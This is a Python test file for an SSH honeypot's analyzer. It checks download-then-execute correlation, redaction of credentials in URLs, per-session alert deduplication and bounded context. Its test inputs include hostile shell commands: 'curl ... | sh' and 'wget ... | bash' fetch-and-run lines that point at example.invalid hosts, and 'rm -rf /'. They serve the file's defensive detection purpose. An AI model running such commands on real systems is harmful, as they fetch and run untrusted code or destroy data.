"""End-to-end checks for v3 correlation, indicators and bounded alerts."""

import io
import json
import unittest

from honeypot.config import HoneypotConfig
from honeypot.intelligence.analyzer import Analyzer
from honeypot.logger import JsonEventLogger
from honeypot.session import SessionState
from honeypot.shell import FakeShell, run_exec_request


class MemoryChannel:
    def __init__(self) -> None:
        self.output = bytearray()
        self.exit_status = None
        self.closed = False

    def sendall(self, data: bytes) -> None:
        self.output.extend(data)

    def settimeout(self, timeout: float) -> None:
        pass

    def send_exit_status(self, value: int) -> None:
        self.exit_status = value

    def close(self) -> None:
        self.closed = True


class VersionThreeTests(unittest.TestCase):
    def test_correlates_download_and_execution_without_exposing_url_credentials(self) -> None:
        analyzer = Analyzer()
        download = analyzer.analyze("wget -O /tmp/start.sh 'https://alice:secret@edge.example.invalid/start.sh?token=private'")
        self.assertEqual(download.indicators["hosts"], ["edge.example.invalid"])
        self.assertEqual(download.indicators["artifacts"], ["start.sh"])
        self.assertNotIn("secret", json.dumps(download.to_dict()))
        execution = analyzer.analyze("sh /tmp/start.sh")
        self.assertIn("download_then_execute", execution.matched_rules)
        self.assertEqual(execution.risk_level, "critical")
        self.assertEqual(analyzer.summary()["stage_sequence"], ["delivery", "execution"])
        self.assertEqual(analyzer.summary()["recent_hosts"], ["edge.example.invalid"])

    def test_stdout_and_another_session_do_not_create_correlations(self) -> None:
        analyzer = Analyzer()
        analyzer.analyze("curl https://example.invalid/payload.sh")  # stdout only
        analyzer.analyze("wget -O - https://example.invalid/payload.sh")  # stdout only
        execution = analyzer.analyze("bash /tmp/payload.sh")
        self.assertNotIn("download_then_execute", execution.matched_rules)
        first = SessionState("192.0.2.1", 1111)
        second = SessionState("192.0.2.2", 2222)
        first.intelligence.analyze("wget -O /tmp/drop.sh https://example.invalid/drop.sh")
        self.assertNotIn("download_then_execute", second.intelligence.analyze("./drop.sh").matched_rules)

    def test_alerts_are_per_session_deduplicated_and_configurable(self) -> None:
        config = HoneypotConfig.from_env({"HONEYPOT_ALERT_MIN_RISK": "75"})
        self.assertEqual(config.alert_min_risk, 75)
        with self.assertRaisesRegex(ValueError, "alert_min_risk"):
            HoneypotConfig.from_env({"HONEYPOT_ALERT_MIN_RISK": "0"})
        analyzer = Analyzer()
        first = analyzer.analyze("curl https://example.invalid/a | sh")
        self.assertTrue(analyzer.claim_alert(first, config.alert_min_risk))
        self.assertFalse(analyzer.claim_alert(analyzer.analyze("wget https://example.invalid/b | bash"), config.alert_min_risk))
        self.assertEqual(analyzer.summary()["alerts_emitted"], 1)
        other = Analyzer()
        self.assertTrue(other.claim_alert(other.analyze("rm -rf /"), config.alert_min_risk))

    def test_bounded_context_and_parse_failure(self) -> None:
        analyzer = Analyzer()
        for index in range(40):
            analyzer.analyze(f"wget -O /tmp/p{index}.sh https://host{index}.example.invalid/p{index}.sh")
        self.assertEqual(len(analyzer.recent_artifacts), 16)
        self.assertEqual(len(analyzer.summary()["recent_hosts"]), 16)
        self.assertTrue(analyzer.analyze("curl 'unfinished").parse_error)

    def test_interactive_and_exec_alert_events_are_correlated_with_commands(self) -> None:
        config = HoneypotConfig(command_delay_min=0, command_delay_max=0)
        stream = io.StringIO()
        logger = JsonEventLogger(stream, asynchronous=False)
        session = SessionState("192.0.2.10", 4444, username="root")
        shell = FakeShell(MemoryChannel(), session, config, logger, False)
        for line in ("wget -O /tmp/x.sh https://example.invalid/x.sh\n", "sh /tmp/x.sh\n", "sh /tmp/x.sh\n"):
            for char in line:
                shell._feed_character(char)
        logger.disconnect(session, "complete")
        events = [json.loads(line) for line in stream.getvalue().splitlines()]
        commands = [event for event in events if event["event"] == "command"]
        alerts = [event for event in events if event["event"] == "intelligence_alert"]
        self.assertEqual(len(commands), 3)
        self.assertEqual(len(alerts), 1)
        self.assertEqual(alerts[0]["primary_rule"], "download_then_execute")
        self.assertNotIn("command", alerts[0])
        self.assertEqual(commands[1]["analysis"]["primary_rule"], "download_then_execute")
        self.assertEqual(events[-1]["intelligence"]["alerts_emitted"], 1)

        exec_session = SessionState("192.0.2.11", 5555, username="root")
        exec_channel = MemoryChannel()
        run_exec_request(exec_channel, exec_session, b"curl https://example.invalid/a | sh", config, logger)
        self.assertTrue(exec_channel.closed)
        self.assertEqual(exec_session.intelligence.summary()["alerts_emitted"], 1)


if __name__ == "__main__":
    unittest.main()
